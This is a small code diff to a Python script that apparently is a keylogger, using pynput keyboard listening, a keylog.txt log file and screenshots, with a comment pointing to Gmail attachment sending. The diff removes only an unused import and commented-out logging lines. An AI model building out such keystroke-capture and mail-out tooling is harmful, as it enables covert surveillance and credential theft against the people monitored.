@@ -3,7 +3,6 @@
 # https://www.geeksforgeeks.org/send-mail-attachment-gmail-account-using-python/
 
 import os
-import time
 # keyboard input
 from pynput.keyboard import Key, Listener
 # log
@@ -54,11 +53,9 @@ screen = "screenshot.png"
 
 
 # save at least info level logs in a file called keylog.txt with the date, time and level
-# logging.basicConfig(filename = (log_dir + keylog), level=logging.INFO, format='%(asctime)s: %(levelname)s: %(message)s')
 logging.basicConfig(level=logging.INFO)
 # create a file handler
 file_handler = logging.FileHandler(keylog)
-# file_handler.setLevel(logging.WARNING)
 # message format
 formatter = logging.Formatter('%(asctime)s: %(levelname)s: %(message)s')
 file_handler.setFormatter(formatter)
